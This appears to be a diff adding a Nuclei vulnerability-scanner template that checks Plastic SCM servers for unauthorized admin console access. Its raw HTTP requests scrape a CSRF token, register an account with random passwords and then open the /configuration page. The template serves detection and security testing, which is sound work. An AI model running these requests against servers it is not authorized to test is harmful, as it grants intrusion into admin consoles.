@@ -1,0 +1,49 @@
+id: unauthorized-plastic-scm
+
+info:
+  name: Unauthorized Access to Plastic Admin Console
+  author: DEENA
+  severity: critical
+  tags: plastic
+  reference: https://infosecwriteups.com/story-of-google-hall-of-fame-and-private-program-bounty-worth-53559a95c468
+
+requests:
+  - raw:
+      - |
+        GET /account/register HTTP/1.1
+        {{Hostname}}
+
+      - |
+        POST /account/register HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/account/register
+        Connection: close
+
+        Password={{randstr}}&ConfirmPassword={{randstr}}&RememberMe=true&__RequestVerificationToken={{csrf}}&RememberMe=false
+
+      - |
+        GET /configuration HTTP/1.1
+        {{Hostname}}
+
+    cookie-reuse: true
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        group: 1
+        name: csrf
+        regex:
+          - 'RequestVerificationToken" type="hidden" value="([A-Za-z0-9_-]+)" \/>'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<title>Network - Plastic SCM</title>"
+        part: body
+
+      - type: status
+        status:
+          - 200
